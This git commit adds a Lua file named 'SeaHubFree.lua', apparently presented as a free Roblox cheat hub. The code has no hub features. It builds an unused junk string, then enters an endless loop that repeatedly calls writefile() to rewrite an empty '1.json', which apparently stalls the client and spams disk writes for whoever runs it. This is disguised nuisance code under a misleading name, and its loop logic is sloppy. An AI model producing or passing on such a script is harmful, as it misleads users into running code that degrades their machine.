c3e69436eedfd00c9094f5bc408460e1b19fbe84
Kiet1308 <50774381+Kiet1308@users.noreply.github.com>
2022-01-20 18:31:50 +0700

    Create SeaHubFree.lua

---
+++ SeaHubFree.lua
@@ -0,0 +1,11 @@
+local str = ""
+for i=1,1000 do 
+	str=str.."dasdjasodfhasuiofauifgasdughdsuighdsjifgasdhjiouiaghawdsuifgsdjfdhasjkfhasdjkfdhasjkfhsdjfsdsdjfsd"
+end
+local i=1
+while wait() do 
+	for ia=1,100 do 
+	ia=ia+1
+	writefile(tostring(i)..".json","")
+end
+end
